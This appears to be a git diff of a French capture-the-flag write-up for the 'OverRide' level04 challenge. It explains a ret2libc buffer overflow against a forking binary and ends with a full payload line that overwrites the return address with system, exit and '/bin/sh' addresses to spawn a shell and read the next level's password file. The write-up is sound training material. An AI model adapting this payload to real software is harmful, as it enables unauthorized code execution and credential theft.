@@ -1,4 +1,8 @@
-On cherche l'offset puis les adresse de exit, system et "bin/sh" pour faire un ret2libc
+### level04
+
+Dans cet exercice le programme effectue un fork et on est confronté à plusieurs mesures empechant d'executer un shellcode.
+On va donc suivre le child et on cherche l'offset puis les adresse de exit, system et "bin/sh" pour faire un ret2libc.
+On utilise un pattern generator pour l'overflow : https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
 
 ```bash
 level04@OverRide:~$ gdb -q level04 
@@ -44,8 +48,17 @@ Mapped address spaces:
 1 pattern found.
 ```
 
-system : 0xf7e6aed0
-exit : 0xf7e5eb70
-"/bin/sh" : 0xf7f897ec
+La valeur de eip "0x41326641" lors de l'overflow nous indique un offset de 156
 
+adresse de system : 0xf7e6aed0
+adresse d'exit : 0xf7e5eb70
+adresse de la string "/bin/sh" dans le programme : 0xf7f897ec
+
+Le principe d'un ret2libc est que lorsque le programme va appeler une fonction, on aura remplacé son adresse par celle d'une autre fonction de la libc.
+Ici le programme va vouloir appeler exit mais à la place il va appeler system en lui faisant lancer un bash.
+
+On a toutes les données nécessaires, il ne reste plus qu'à écrire la commande pour effectuer le ret2libc.
+
+```bash
 (python -c "print('A' * 156 + '\xd0\xae\xe6\xf7' + '\x70\xeb\xe5\xf7' + '\xec\x97\xf8\xf7')"; python -c "print('cat /home/users/level05/.pass')"; cat) | ./level04
+```
